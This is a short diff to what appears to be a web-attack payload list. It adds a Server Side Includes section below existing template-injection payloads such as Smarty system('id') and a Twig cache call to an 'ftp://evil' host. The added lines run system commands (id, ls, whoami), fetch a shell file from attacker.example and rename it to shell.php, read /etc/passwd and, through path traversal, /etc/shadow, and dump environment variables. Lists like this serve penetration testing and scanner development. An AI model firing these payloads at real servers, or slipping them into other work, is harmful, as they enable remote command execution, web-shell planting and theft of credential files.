@@ -36,3 +36,12 @@ ${''.getClass().forName('java.lang.Runtime')}
 {php}system('id');{/php}
 {system('id')}
 {{_self.env.setCache("ftp://evil")}}
+
+# === Server Side Includes (SSI) ===
+<!--#exec cmd="ls" -->
+<!--#exec cmd="id"-->
+<!--#exec cmd="wget http://attacker.example/shell.txt | rename shell.txt shell.php"-->
+<!--#include virtual="/etc/passwd" -->
+<!--#include file="../../../etc/shadow" -->
+<!-- #exec cmd="whoami" -->
+<!--#printenv -->
